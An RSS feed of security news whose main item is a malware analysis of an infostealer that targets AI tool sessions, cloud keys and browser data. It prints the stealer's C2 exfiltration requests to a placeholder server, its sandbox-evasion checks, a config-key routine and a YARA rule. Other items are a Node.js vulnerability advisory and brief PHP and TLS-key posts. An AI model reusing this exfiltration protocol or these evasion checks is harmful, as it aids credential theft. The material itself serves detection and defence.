item.title: Infostealer riding the AI Train
item.description:
Key Points Introduction Infostealers commonly target browser passwords, session cookies, and cryptocurrency wallets. This malware combines those established capabilities with dedicated collection routines for AI applications and development tools. Its targets include Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, and GitHub Copilot, alongside cloud credentials and sensitive files from local development environments. This expanded targeting reflects […]

The post Infostealer riding the AI Train appeared first on Check Point Research.
item.content:encoded:
Key Points

  • Aokigahara, a newly observed infostealer, has been spotted in the wild. An earlier version may have been known as Kamidere or Stygian. The malware includes traditional data theft capabilities targeting browsers, VPN clients, cryptocurrency wallets, FTP/SFTP clients, password managers, and email applications, among other targets.
  • AI applications and development tools are notable targets. The stealer collects authentication files, session data, and configuration files associated with Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, GitHub Copilot, Gemini CLI, and other tools.
  • Stolen AI credentials could offer opportunities for monetization. Usable credentials or session tokens could enable unauthorized access to paid AI services or the resale of compromised accounts.
  • Its collection scope extends to developer and cloud environments. Targets include Git credential files, SSH private keys, and AWS, Azure, and Google Cloud credential and configuration files.


Introduction

Infostealers commonly target browser passwords, session cookies, and cryptocurrency wallets. This malware combines those established capabilities with dedicated collection routines for AI applications and development tools. Its targets include Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, and GitHub Copilot, alongside cloud credentials and sensitive files from local development environments.

This expanded targeting reflects a broader shift in what attackers may consider valuable, not only personal accounts and financial data, but also access to AI services and the environments developers use to build software. Valid credentials or session tokens could expose private conversations and development data, enable unauthorized use of paid services, or potentially be sold to provide access to compromised AI accounts. While the malware’s collection routines support these possibilities, the analysis does not confirm how its operators monetize the stolen data.


Stealer Capabilities and Targeted Applications

The Aokigahara infostealer includes common information-stealing capabilities, such as screenshot capture, clipboard collection, browser credential and cookie theft, cryptocurrency wallet data collection, and file grabbing. It also includes a clipper handler that drops a separate component for clipboard manipulation.

The malware targets Chromium-based browsers and Mozilla Firefox, desktop cryptocurrency wallets and browser wallet extensions, messaging applications such as Discord and Telegram, and gaming platforms such as Steam, Roblox, and Minecraft. Additional targets include password managers, VPN clients, FTP/SFTP clients, email applications, and AI development tools. The table below summarizes each handler, its targets, and any limitations identified during the analysis.

The table below lists the malware’s main capabilities and their corresponding internal function names.


AI Data Theft

The more distinctive capability is the aisessions handler, which targets AI applications and development tools. These include Claude, ChatGPT Desktop, Codex, Cursor, Windsurf, GitHub Copilot, and Gemini CLI, alongside AWS credentials and single sign-on (SSO) data. This extends the malware’s collection beyond traditional personal accounts to authentication files, session data, and configuration files associated with AI-assisted development and cloud environments.

The paths below identify the handler’s collection targets. Depending on the application, these files may contain tokens, credentials, session data, or settings; not every targeted file necessarily contains authentication secrets.

Attackers target these files because they may contain authentication tokens, API keys, cloud credentials, and session data. If valid and usable, these secrets can allow attackers to access AI services or cloud environments without entering a password, potentially exposing private conversations, source code, and other sensitive information. Compromised accounts may also be used to consume paid services, generate unauthorized charges, or support further attacks.


Anti-Analysis

The infostealer includes several known anti-analysis checks, most of which run only when their corresponding configuration flags are enabled. The results of these checks determine whether the malware continues execution. It also dynamically resolves Windows API functions using hashes and uses control-flow flattening in some parts of the code, particularly around the configuration decryption routine.

When the language-check flag is enabled, the malware checks the system’s keyboard layout and Windows UI language. If either matches a language ID represented in the bitmask 0x6C0400C8601, the malware stops execution. The excluded language settings are listed below.

The second configuration flag enables analysis-environment checks, including anti-debugging, virtual machine detection, and sandbox detection. The anti-debugging checks include:

  • Inspection of debugger-related flags in the Process Environment Block (PEB).
  • Queries for the process debug port and debug object.
  • A debug-output string check.
  • Inspection of hardware breakpoint registers (DR0–DR3).

The malware checks for indicators of virtualized or analysis environments, including:

  • Hypervisor identifiers obtained through the CPUID instruction.
  • Registry entries and running processes associated with virtual machine guest tools.
  • Firmware and System Management BIOS (SMBIOS) fingerprints.
  • A low number of running processes.
  • Suspicious usernames and computer names.
  • Display characteristics and available hardware resources.

The malware also checks usernames and computer names against strings commonly associated with test or analysis environments. The inspected strings include:

"sandbox", "malware", "virus", "sample", "test", "user", "admin", "CurrentUser", "John", "Peter", "JOHN", "John Doe", "WDAGUtilityAccount"

Additional checks monitor cursor movement and the number of running processes. These signals may help the malware identify automated analysis environments.


Configuration

The encrypted configuration blob is stored in the .stgcfg section. It begins with a four-byte magic value STGC, followed by the ciphertext length, a 16-byte initialization vector (IV) used for AES-CBC decryption, and the encrypted configuration data.

struct EncryptedConfigBlob
{
    DWORD magic;              // Four-byte configuration magic
    DWORD ciphertext_len;     // Encrypted configuration size in bytes
    BYTE  iv[0x10];            // 16-byte AES-CBC initialization vector
    BYTE  ciphertext[];       // Encrypted configuration data
};

The AES IV is stored in the .stgcfg section, while the malware derives the AES key from a specific seed using the algorithm below. The routine produces a 32-byte key used to decrypt the configuration with AES-256-CBC.

"""
Author: @Tera0017/Check Point Research
"""
def decrypt_aes_key(seed: int, length: int = 32) -> bytes:
    key = bytearray()

    for i in range(length):
        seed ^= (seed >> (8 * (i & 3))) & 0xFF

        seed = (seed * 0x01000193) & 0xFFFFFFFF

        seed ^= seed >> 16

        key.append(seed & 0xFF)

    return bytes(key)

The decrypted configuration contains the command-and-control (C&C) URL, the server’s X25519 public key, a build ID, and a gate token used for communication. It also includes a module bitmask that controls which capabilities are executed, flags for language and analysis-environment checks, TLS certificate pinning settings, and up to three fallback URLs.

struct DecryptedConfig
{
    char  base_url[0x100];
    BYTE  server_x25519_public_key[0x20];
    char  build_id[0x20];
    char  gate_token[0x40];
    DWORD module_mask;

    BYTE  unk_184[0x404];

    BYTE  language_check;
    BYTE  analysis_environment_check;
    BYTE  unk_58A;
    
    BYTE  tls_certificate_sha256[0x20];
    BYTE  tls_pin_enabled;

    BYTE  fallback_urls[3][0x100];
    BYTE  fallback_count;
};

The malware uses the module_mask bitmask in its configuration to control which built-in capabilities are executed. Each entry in the module-dispatch table contains a function pointer and an associated feature mask. During dispatch, the malware performs a bitwise AND between module_mask and the entry’s feature mask. A nonzero result selects the corresponding function for execution.

All module implementations remain embedded in the executable, even when disabled in the configuration.


Network

The malware retrieves its C&C connection settings from the decrypted configuration. It uses the /gate path as the base for three endpoints that handle session establishment, stolen data uploads, and session completion.

The stealer generates an X25519 key pair consisting of a public key and a private key. It then computes a shared secret using its private key and the server_x25519_public_key stored in the decrypted configuration. The malware derives the communication encryption key from this shared secret using SHA-256 and the fixed string aokigahara. The resulting 32-byte key is used for AES-GCM encryption.

/handshake

The initial handshake registers the upload session with the C&C server and sends the client’s 32-byte X25519 public key in the request body. The request headers include the build ID, gate token, session ID, hardware identifier, and key exchange algorithm.

POST /gate/handshake HTTP/1.1
Connection: Keep-Alive
Content-Type: application/octet-stream
User-Agent: Microsoft-CryptoAPI/10.0
X-Build-ID: cae87a25
X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e
X-Session: ca47b44161834cb70a224dbe3d92a383
X-HWID: 69B506A1
X-KEX: x25519
Content-Length: 32
Host: $SERVER

$CLIENT_X25519_PUBLIC_KEY

/chunk

For each executed collection module, the malware uploads an AES-GCM-encrypted ZIP archive to /gate/chunk. The X-Chunk header identifies the type of stolen data, using module labels such as sysinfo, browsers, firefox, or aisessions. The X-Chunk-Index header identifies the upload’s sequence number, which is also included in the request body.

The malware allocates an upload buffer with a size equal to the ZIP archive’s size plus 28 bytes. The buffer begins with a 12-byte AES-GCM nonce, formed by combining the four-byte little-endian chunk index with eight randomly generated bytes. The encrypted ZIP archive follows the nonce, and a 16-byte AES-GCM authentication tag is appended at the end.

POST /gate/chunk HTTP/1.1
Connection: Keep-Alive
Content-Type: application/octet-stream
User-Agent: Microsoft-CryptoAPI/10.0
X-Build-ID: 4dbf818f
X-HWID: 69B506A1
X-Chunk: sysinfo
X-Chunk-Index: 0
X-Session: ca47b44161834cb70a224dbe3d92a383
X-Total: 19
X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e
Content-Length: 3233
Host: $SERVER

\x00\x00\x00\x00$RANDOM_8_BYTES || $AES_GCM_CIPHERTEXT || $GCM_AUTH_TAG_16_BYTES

The next example uploads screenshot data with a chunk index of 1. The request body begins with \x01\x00\x00\x00.

POST /gate/chunk HTTP/1.1
Connection: Keep-Alive
Content-Type: application/octet-stream
User-Agent: Microsoft-CryptoAPI/10.0
X-Build-ID: 4dbf818f
X-HWID: 69B506A1
X-Chunk: screenshot
X-Chunk-Index: 1
X-Session: ca47b44161834cb70a224dbe3d92a383
X-Total: 19
X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e
Content-Length: 10066
Host: $SERVER

\x01\x00\x00\x00$RANDOM_8_BYTES || $AES_GCM_CIPHERTEXT || $GCM_AUTH_TAG_16_BYTES

/complete

After uploading all ZIP archives, the malware sends a final HTTP POST request to /gate/complete on the C&C server. The request body contains the eight-byte message COMPLETE, indicating that the upload process has finished.

POST /gate/complete HTTP/1.1
Connection: Keep-Alive
Content-Type: application/octet-stream
User-Agent: Microsoft-CryptoAPI/10.0
X-Build-ID: 4dbf818f
X-HWID: 69B506A1
X-Session: ca47b44161834cb70a224dbe3d92a383
X-Gate-Token: fc157583cc171c2c82419748390126839a0f8fba317a75f919e785aca3d98f8e
Content-Length: 8
Host: $SERVER

COMPLETE

The stealer appears to be under active development, with changes to its HTTP User-Agent string observed across versions. The latest analyzed samples use Microsoft-CryptoAPI/10.0 for communication with the server.


Conclusion

The malware retains the broad collection capabilities expected of an infostealer, but its dedicated targeting of AI applications and developer tools is particularly notable. By collecting authentication files, application storage, Git credentials, SSH-related files, and cloud configuration data, it reaches beyond traditional consumer accounts into AI-assisted development and cloud environments.

The targeting of AI sessions creates a potential route to monetization through unauthorized use of paid services or the resale of compromised access. It may also create opportunities for data extortion. Users can share sensitive business information, proprietary source code, and other confidential material with AI services. If stolen credentials or session tokens provide access to conversation histories or uploaded files, attackers could potentially threaten to disclose that information to demand payment.

The key finding is that AI application credentials and session data are part of this malware’s collection scope and should be treated as sensitive assets alongside browser sessions, cloud credentials, and developer keys.


Indicators of Compromise


Yara Rule

rule aokigahara
{
    meta:
        author = "@Tera0017/Check Point Research"
        description = "Aokigahara Stealer"
    strings:
        $str1 = "X-Chunk-Index: %u" ascii fullword
        $str2 = "X-Build-ID: %s" ascii fullword
        $str3 = "AKGRES" ascii fullword
        $str4 = "AISessions/" ascii
        $str5 = "\\\\.\\pipe\\akg_%lx_%lx" ascii fullword
        $str6 = "sysinfo\x00screenshot\x00clipboard"
        $str7 = "aokigahara" ascii fullword
        $str8 = "kamidere" ascii fullword
        $str9 = "/chunk" ascii fullword
        $str10 = "%s\\kmd_w_%d_%d.db" ascii fullword
        $str11 = ".ROBLOSECURITY" ascii fullword
        $code1 = {45 69 ED B1 79 37 9E 48 C1 EF 11 48 C1 EA 20 41 31 D6 41 31 C6 41 31 FD 45 89 77 04 45 89 6F 08}
        $code2 = {41 4B 47 52 45 53 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? EF BE AD DE }
    condition:
        uint16(0) == 0x5A4D and 3 of them
}

The post Infostealer riding the AI Train appeared first on Check Point Research.

item.title: Node.js Patches Brotli Remote Code Execution Flaw: Find Vulnerable Runtimes Before Attackers Do
item.description: Executive Summary On October 21, 2026, Node.js released fixes for 10 vulnerabilities across its three supported release lines: 22.x, 24.x, and 26.x. Four are rated High. The most severe, CVE-2026-111497, is an out-of-bounds write in the bundled Brotli decoder that Node.js says permits remote code execution. These flaws live in the Node.js runtime itself, not […]
item.content:encoded:
Executive Summary

On October 21, 2026, Node.js released fixes for 10 vulnerabilities across its three supported release lines: 22.x, 24.x, and 26.x. Four are rated High. The most severe, CVE-2026-111497, is an out-of-bounds write in the bundled Brotli decoder that Node.js says permits remote code execution. These flaws live in the Node.js runtime itself, not in application packages, so application dependency checks will not surface them. Qualys Threat Research Unit data shows that nine in 10 Node.js installations are either unpatched or on lines that will never receive these fixes. Qualys customers can detect exposure with InstaScan as soon as the advisory is published and find affected runtimes across hosts, containers, and cloud workloads, including copies outside standard install paths. They can then prioritize those exposed to the internet, patch with TruRisk Eliminate, and confirm each fix.

Why This Release Needs Attention Now

The four high-severity vulnerabilities affect two areas almost every Node.js service relies on: compressed data and outbound connections.

  • Brotli decompression (CVE-2026-111497): This flaw is in the code that decompresses Brotli data. Any service that unpacks Brotli content it didn’t create is exposed, and Node.js says the flaw can permit remote code execution.
  • Hostname and certificate checks (CVE-2026-105482, CVE-2026-105483, CVE-2026-106069): These flaws weaken Node.js’s ability to verify hostnames and certificates. Services that connect to hosts on behalf of users are most at risk.

Where things stand now:

  • Scores confirm the urgency: CVE-2026-111497 now has a CVSS 4.0 score of 9.2 (Critical). Its QVSS score, which adds Qualys threat intelligence, is higher. See the latest score and threat indicators in ETM below.
  • Patches are available: Node.js fixed these flaws in 22.23.4, 24.22.1, and 26.12.1. Qualys patches are available in TruRisk Eliminate for 22.x, 24.x, and 26.x. Check each patch’s reliability score before deploying.
  • No official workarounds: Node.js has not published workarounds. Upgrading the runtime is the only complete fix. The Qualys TRU mitigations later in this post reduce exposure while teams patch.
  • Unsupported lines stay vulnerable: Only 22.x, 24.x, and 26.x received fixes. All other lines, including 25.x, 20.x, and earlier, remain vulnerable and must be upgraded to a supported release.

Why Updating Application Dependencies Is Not Enough

Updating application dependencies alone will not resolve these issues. The vulnerable code is included in the Node.js runtime, which encompasses runtimes embedded in container images and single-executable applications (SEAs).

Node.js also often runs from nonstandard locations:

  • Version managers such as nvm
  • Application folders
  • Bundled runtimes
  • SEAs
  • Container images, running containers, and serverless functions such as AWS Lambda Node.js runtimes

What the Vulnerabilities Affect

The vulnerabilities span zlib, DNS, TLS, HTTP, crypto, and the Permission Model. Three of the four high-severity issues weaken hostname or certificate validation, which matters for any service that makes outbound TLS or DNS calls on behalf of users.

High-Severity Vulnerabilities

CVE-2026-111497 (Brotli). A crafted Brotli stream can cause the decoder to write outside its allocated memory bounds. Node.js classifies this outcome as a remote code execution vulnerability. Services that decompress Brotli data from untrusted sources, such as HTTP clients and proxies that accept the Content-Encoding: br, or services that handle uploaded compressed files, are particularly at risk.

CVE-2026-105482 (DNS). The functions dns.resolve*, dns.reverse, and the Resolver class send names to c-ares as C strings. Therefore, if an embedded NUL character is present, it will truncate the name. An application has the ability to validate one hostname against an allowlist while querying a different name. The dns.lookup function remains unaffected by this issue.

CVE-2026-106069 (TLS). The `tls.checkServerIdentity` function can verify a non-canonical IP address, such as one in octal or shortened form, against a certificate for one address while the connection is directed to a different one. This vulnerability allows an attacker to present a certificate that is valid for an endpoint that does not actually belong to them.

CVE-2026-105483 (TLS). Hostnames using Unicode fullwidth digits normalize to an IP address and can match a certificate issued for that IP. This issue only affects the 24.x and 26.x lines.

Medium- and Low-Severity Vulnerabilities

  • CVE-2026-105481 (Medium, HTTP): With http.Agent keep-alive, a server can send a response through an idle reused socket before the next request, which Node.js will interpret as the response to that request.
  • CVE-2026-106072 (Medium, TLS): Certificates with DNS names were accepted for non-canonical IPv4 endpoints. This issue has been resolved in the same commit as CVE-2026-106069.
  • CVE-2026-106074 (Medium, crypto): Cached values for crypto.randomUUID and crypto.randomInt were stored in startup snapshots, causing processes that initiated from the same snapshot to produce identical initial values. Only SEAs using useSnapshot or user-land snapshots are affected.
  • CVE-2026-106070 (Low, zlib): In the experimental zlib.ZipFile API (added in 26.8.0), a read after a failed header check could return bytes from the wrong file position.
  • CVE-2026-106071 (Low, Permission Model): Using Wildcard paths in the --allow-fs-read or --allow-fs-write options may provide access to more files paths than originally intended.
  • CVE-2026-106073 (Low, fs): fs.realpathSync bypassed the Permission Model check that its sibling functions perform, allowing calls on ungranted paths.

Node.js by the Numbers: Nine in 10 Installations Are Unpatched or Unsupported

The Qualys Threat Research Unit analyzed anonymized data to measure exposure to the October 2026 Node.js vulnerabilities.

We found 3.3 million Node.js package installations, and 15% of them are on internet-facing assets, within reach of remote attackers.

Across those installations:

  • 1.3 million run supported lines, Node.js 22, 24, and 26. A fixed release is available for these versions, but it has not been applied yet.
  • 1.7 million run end-of-life or end-of-support lines, Node.js 25, 23, 20, and older. These lines get no upstream fix, so moving to a supported line is the only remedy.
  • Only 42,000 have been patched so far.

The takeaway: More than half of Node.js installations run versions that will never receive these fixes, and nearly all of the rest have not been patched yet.

Fixed Versions and Upgrade Guidance

Each supported line has a fixed release, and any subsequent release in the same line also includes the fixes.

Node.js version 26 will become LTS on October 28, 2026. Teams using version 26.x should upgrade to version 26.12.1 before this transition.

Simply updating application dependencies does not resolve these issues. The vulnerable code is included with the Node.js runtime, which encompasses runtimes found in container-based images and single-executable applications (SEAs).

What Qualys Customers Can Do

Qualys customers can identify every vulnerable Node.js runtime across hosts, containers, and cloud workloads, and track remediation in a single view. Detections for the October 2026 release are detailed below.

Extend Node.js Remediation Verification to Web Applications and APIs with TotalAppSec

Patching vulnerable Node.js runtimes is the crucial first step in addressing the Brotli vulnerability (CVE-2026-111497). Qualys TotalAppSec extends remediation verification to the web applications and APIs running on these runtimes.

After applying the necessary security patch updates, rescan your web applications and APIs with TotalAppSec using QID 533085 to validate that the Node.js Brotli vulnerability has been resolved. 

Important: Use caution when employing QID 533085. This intrusive check may cause applications or APIs running on vulnerable Node.js versions to crash, potentially disrupting service availability. Therefore, run this check only in QA/test environments or against systems confirmed to have patched Node.js runtimes. Do not enable QID 533085 on unpatched or unverified production applications or APIs.

For comprehensive remediation verification, use Qualys VMDR or TotalCloud to check the installed Node.js runtime versions and patch status in conjunction with TotalAppSec’s application-level assessment.

How Qualys Finds and Closes Node.js Exposure

The Qualys Enterprise TruRisk Platform takes teams from advisory to verified fix in six stages, using the inventory and telemetry they already have.

  1. Detect at disclosure with InstaScan. InstaScan, powered by Agent Insta, matches new advisories against your existing software inventory, so Node.js findings surface without a new scan job. See how InstaScan surfaced Node.js exposure.
  2. Find every runtime with CSAM and Qualys Deep Scan. List assets running on affected Node.js, including copies outside standard install paths and in cloud and container workloads. See how to find every affected Node.js runtime See how to find every affected Node.js runtime.
  3. Cover cloud, containers, and serverless with TotalCloud and Container Security. Find affected Node.js across cloud workloads, images, and serverless functions, and see which copies are actually in use See the full cloud and container details.
  4. Prioritize with Enterprise TruRisk Management (ETM). TruRisk scoring adds asset and exposure context, so teams can fix the most exposed runtimes first. See how to prioritize Node.js remediation.
  5. Patch with TruRisk Eliminate. Qualys-published patches are available for the 24.x and 26.x lines; teams on 22.x should upgrade the runtime manually until a patch is available. See patch reliability and deployment guidance.
  6. Confirm the fix. After upgrading, rescan with Cloud Agent, TotalAppSec, or Container Security and confirm the detection QIDs are closed. See the full remediation checklist.

Detect Node.js Exposure at Disclosure with InstaScan

On most platforms, a security release kicks off a waiting game. Wait for the vendor to write a signature. Wait for the next scan window. Wait for the results to process. Only then does a team learn where it’s exposed, often days after the advisory went live. InstaScan ends that cycle. 

InstaScan ends that cycle. Within minutes of the October 2026 Node.js security release going public, InstaScan, powered by Agent Insta, correlated the new CVEs against the asset and software telemetry Qualys customers already collect and surfaced exposed Node.js runtimes as live findings: tagged by CVE, including the Brotli remote code execution flaw (CVE-2026-111497), rated by severity, and tied to the impacted asset. No scan to schedule. No waiting for the next scan window. No processing lag.

That matters for a release like this one. The vulnerable code lives in the runtime itself, not in a package manifest, and it hides in version managers, container images, single-executable apps, and serverless functions that dependency checks never touch. InstaScan doesn’t care where the runtime is installed; it reasons from what’s actually on the asset and flags exposure the moment a new advisory lands. The result is a view of Node.js risk that is already prioritized and already tied to the assets that matter, long before a traditional detection pipeline would have surfaced the first finding. 

That’s scanless scanning in action, and it’s why Qualys customers knew exactly where they stood on Node.js while everyone else was still waiting on their scanner.

Find Every Node.js Runtime with CSAM and Qualys Deep Scan

Deep Scan identifies vulnerable Node.js runtimes in custom application folders, secondary drives, and other configured directories. Findings appear in VMDR with the full binary path, installed version, and recommended fixed version. This information gives security and IT teams the details they need to locate and address overlooked installations.

Run the following queries in CSAM > Inventory > Assets.

Identify Vulnerable Node.js Across Cloud Workloads, Containers, and Serverless Functions

With Qualys TotalCloud and Container Security, customers can use Qualys Query Language (QQL) to quickly identify cloud workloads, containers, images, serverless functions, VM images (AMIs), and code built on affected Node.js versions, including older releases that have reached end-of-life or end-of-support.

Customers can use the following QQL query to find images and containers running affected Node.js versions:

software: (name: "nodejs" and version: [0 ... 22.23.3]) 
or software: (name: "nodejs" and version: [23.0.0 ... 23.11.1]) 
or software: (name: "nodejs" and version: [24.0.0 ... 24.22.0]) 
or software: (name: "nodejs" and version: [25.0.0 ... 25.9.0]) 
or software: (name: "nodejs" and version: [26.0.0 ... 26.12.0])

Beyond identifying vulnerable images, Qualys provides visibility into the deployed containers associated with those images, helping teams understand where affected Node.js packages are running. With the Qualys Runtime Sensor, customers can further distinguish packages that are simply present in an image from those actively in use or runtime reachable, enabling more precise risk prioritization.

Security teams can then focus remediation on the most critical workloads, update affected Node.js packages, rebuild and redeploy container images, and verify that exposures have been eliminated.

The outcome is a unified view of impacted Node.js runtimes across hosts, containers, and serverless workloads, ranked by real exposure and tracked through to a confirmed fix.

Prioritize with Enterprise TruRisk Management (ETM)

Not every Node.js runtime carries the same risk, so not every affected asset needs to be patched first. ETM combines Node.js findings from Qualys and third-party sources, removes duplicates, and gives each one a TruRisk score. That score weighs Qualys threat intelligence against each asset’s business criticality and exposure.

From CVSS to QVSS

CVSS rates how severe a flaw could be. QVSS adds live Qualys threat intelligence and the customer’s own asset impact to show which flaws attackers are exploiting now and need fixing first.

With that context, the order of remediation becomes clear:

  • Fix first: Internet-facing services that decompress untrusted Brotli data (CVE-2026-111497). They are the most direct path to remote code execution.
  • Fix next: Services that open TLS connections to user-supplied hosts (CVE-2026-106069, CVE-2026-105483). Here, a hostname validation bypass can expose traffic to interception. 
  • Plan upgrades: Runtimes on end-of-life lines. They will never receive a fix, so they need an upgrade plan rather than a patch. 

With this approach, teams focus their efforts on the assets an attacker can actually reach, not on every Node.js installation in the environment.

Track Exposure with the Node.js Dashboard

Once priorities are set, the dashboard turns them into a view that teams can act on. It shows Node.js runtimes across the customer’s environment, which ones are at risk, and what to fix first:

  • Know the full Node.js footprint. Assets running Node.js and how each one was discovered. This includes runtimes in container images, serverless functions, and bundled or nonstandard install paths.
  • See where the real risk is. Internet-facing runtimes, instances grouped by affected release line (22.x, 24.x, 26.x), and end-of-life or unsupported versions in their own group.
  • Prioritize and act fast. High-TruRisk assets grouped by operating system, with each detection’s age and status (active, fixed, or reopened).

As patches roll out, the dashboard tracks progress and confirms that QIDs 389117, 389119, and 389122 close after the rescan, so teams can see that the risk is gone and not just assume the patch worked.

Download the Node.js exposure dashboard today.

Download Now

Reduce Exposure and Patch

Upgrading the runtime is the only complete fix. Use the interim steps below to narrow exposure while you plan the upgrade, then deploy the fixed releases.

Reduce Exposure Before You Patch

Node.js has not published workarounds, so the interim steps below come from the Qualys Threat Research Unit (TRU). They narrow specific attack paths; they do not make an unpatched runtime safe.

  • Avoid Brotli decompression of untrusted input where possible. Limit compressed payload size and decompression ratio at the reverse proxy or WAF.
  • Resolve user-supplied names with dns.lookup instead of dns.resolve*, and reject hostnames containing NUL characters.
  • Convert IP addresses to canonical form before they reach a TLS connection. Reject fullwidth and other non-canonical forms.
  • Disable keepAlive on http.Agentfor connections to untrusted servers.
  • Do not rely on the Permission Model as a security boundary on affected versions.

Patch with Confidence

Node.js has released fixes, and Qualys-published patches are already available in TruRisk Eliminate for the 22.x, 24.x, and 26 lines. 

Customers can use the following QQL query in the patch catalog to find the patches associated with these vulnerabilities. Any of these patches that are missing from a customer’s environment appear in the results.

patch.cveId:[CVE-2026-111497, CVE-2026-105482,CVE-2026-105483,
CVE-2026-106069,CVE-2026-105481,CVE-2026-106072,CVE-2026-106074,
CVE-2026-106070,CVE-2026-106071,CVE-2026-106073]

For the 22.x, 24.x and 26.x patches:

  • Patch reliability: High for 22.23.4, 24.22.1, and 26.12.1. Qualys rates both patches with a High reliability score, so they’re unlikely to disrupt production.
  • No OS reboot required. Node.js does not include kernel modules, drivers, or system services, so upgrading the runtime does not require a reboot.
  • Restart every service that runs on Node.js. Long-running processes, containers and SEAs keep the vulnerable runtime in memory until they restart. 

Once the relevant patch is successfully applied, the next VM scan marks the vulnerabilities on that host as closed.

Confirm That Remediation Is Complete

  1. Upgrade every copy. Move each supported line to 22.23.4, 24.22.1, or 26.12.1, and migrate end-of-life lines to a supported release.
  2. Rebuild what embeds the runtime. Rebuild container images and SEAs on the fixed version, then redeploy them.
  3. Restart long-running services, so they load the new runtime.
  4. Rescan and verify. Rescan with Cloud Agent or Container Security and confirm the detection QIDs are closed.

Connect Your AI Assistant to Qualys in Three Steps

You can now bring Qualys data into your AI workflows with qualys-cli-mcp, a Model Context Protocol (MCP) server for the Qualys Cloud Platform. Claude, Cursor, VS Code, and other MCP-capable assistants can use it to query your Qualys environment in plain language. For example, you can ask “Can you check in Qualys if I’m vulnerable to CVE-2026-111497 or any of the October 2026 Node.js vulnerabilities?″ without writing API calls or switching consoles.

That’s it. Your assistant can now work across Qualys.

What This Means for Security Teams

The crucial question after the release of the Node.js security update is not just, “Are we using Node.js?” but rather, “Where are all the vulnerable runtime installations, and which ones could be accessed by attackers?” Node.js runtimes can be found in various environments such as version managers, application directories, containers, serverless environments, and embedded deployments, often outside of standard installation paths. As these vulnerabilities impact the runtime itself, traditional application dependency checks may overlook them.

With Qualys, security teams can identify potentially affected Node.js runtimes immediately after a vulnerability is disclosed, including those installed outside standard paths and across various cloud and container workloads. Qualys helps prioritize remediation of internet-facing services that handle untrusted input. Teams can apply available patches using Qualys TruRisk Eliminate, manually upgrade runtimes as needed, and rebuild and redeploy affected container images or embedded runtimes. Follow-up vulnerability assessments ensure that remediation efforts have been successfully completed.

By integrating vulnerability detection, risk-based prioritization, supported patch deployment, and remediation verification into the Qualys platform, organizations can reduce their reliance on disconnected tools and accelerate their response to critical Node.js vulnerabilities, especially in cloud-native workloads with separate deployment pipelines.

Reference

Node.js Project: Wednesday, October 21, 2026 Security Releases

item.title: Compromised TLS Certificates
item.description:
The Indian CA eMudhra Limited has eight TLS certificates with laughably weak private keys:

The compromised eMudhra keys were defective at a level that’s challenging the imagination of many of the engineers studying the incident. A normal size for a NIST P-384 elliptic curve cryptography private key contains roughly 384 bits of entropy, a size allowing almost 2384, or a number with 116 digits, different possibilities. The private key sizes of the compromised keys ranged from 3 to 8 bits. Astonishingly, the private keys were 4, 56, 66, 115, 155, 156, 230, 237...
item.content:encoded:
The Indian CA eMudhra Limited has eight TLS certificates with laughably weak private keys:

The compromised eMudhra keys were defective at a level that’s challenging the imagination of many of the engineers studying the incident. A normal size for a NIST P-384 elliptic curve cryptography private key contains roughly 384 bits of entropy, a size allowing almost 2384, or a number with 116 digits, different possibilities. The private key sizes of the compromised keys ranged from 3 to 8 bits. Astonishingly, the private keys were 4, 56, 66, 115, 155, 156, 230, 237.

“That is extremely in the ‘this should not be possible’ category,” Valdorda said. “Maybe some horribly dangerous key generation interface has a ‘size’ parameter and they set it to 1 by mistake???”

Ben Cartwright-Cox, director of BGP.tools, said: “My guess is that it’s example code that accidentally leaked to production, but hard to know. But it’s bonkers that no one noticed.”

At this early stage, the most immediate threat appears to be for those using VPNs, especially in countries with governments likely to maliciously intercept traffic. There are likely many other cases for concern. End users largely have no recourse other than to hold off using many non-browser forms of TLS communication until they receive assurances updates are in place.

The whole certificate regime has long been a mess:

The incident is the latest to expose a fatal flaw in the TLS regimen. It’s only as strong as its weakest link, which in this case was eMudhra. Fortunately, transparency logs account for much of that failure, but this measure requires parties to actively monitor massive feeds and works only after unauthorized certificates have been issued. eMudhra representatives weren’t immediately available to answer questions.

One caveat: exploiting compromised certificates requires an active adversary-in-the-middle attack, meaning the attacker must act as a proxy between two TLS parties and receive encrypted traffic, decrypt it, reencrypt it, and send it to the other party. Such capabilities, in some cases, are usually limited to only the most well-resourced attackers. People with control of a local network­at a coffee shop, university, or other organization­face much less of a challenge.

Cleanup of this is going to be another mess—and it’s right on top of the PHP vulnerabilities.

Some more information.

item.title: New Serious PHP Vulnerabilities Released and Patched
item.description:
PHP maintainers have released fixes for two critical vulnerabilities:

PHP 8.5.12, 8.4.27, 8.3.36 and 8.2.35 fix two critical vulnerabilities that can allow unauthenticated remote code execution. All PHP users are strongly encouraged to update immediately.

Who is at risk: all PHP installations serving web requests, including PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP and LiteSpeed. We consider the risk highest for mod_php, with a demonstrated exploit where an unauthenticated request can trigger the attack before any application code runs...
item.content:encoded:
PHP maintainers have released fixes for two critical vulnerabilities:

PHP 8.5.12, 8.4.27, 8.3.36 and 8.2.35 fix two critical vulnerabilities that can allow unauthenticated remote code execution. All PHP users are strongly encouraged to update immediately.

Who is at risk: all PHP installations serving web requests, including PHP-FPM, Apache with mod_php, php-cgi, FrankenPHP and LiteSpeed. We consider the risk highest for mod_php, with a demonstrated exploit where an unauthenticated request can trigger the attack before any application code runs.

The vulnerabilities:

  • RCE via OOM corruption, CVE-2026-109618 (GHSA-w8hw-w9fx-j79w): out-of-memory handling can interrupt PHP while internal request data is only partially initialized. Request cleanup may then treat the invalid data as valid.
  • RCE via stale global state, CVE-2026-109619 (GHSA-6wmf-4rv5-p3rp): request-owned internal state can survive after its backing memory has been freed. A later request handled by the same worker may use that stale state before normal initialization resets it.

Updating PHP is the only way to regain security. Do it now.

More news.

Good explanations.

item.title: Localizing compliance at scale: achieving South Korea’s ISMS certification
item.description: Cloudflare has achieved South Korea's ISMS certification following an audit across 80 controls. Learn how we localized user consent flows, adapted social sign-up paths at the edge, and validated our global security program.
item.content:encoded:
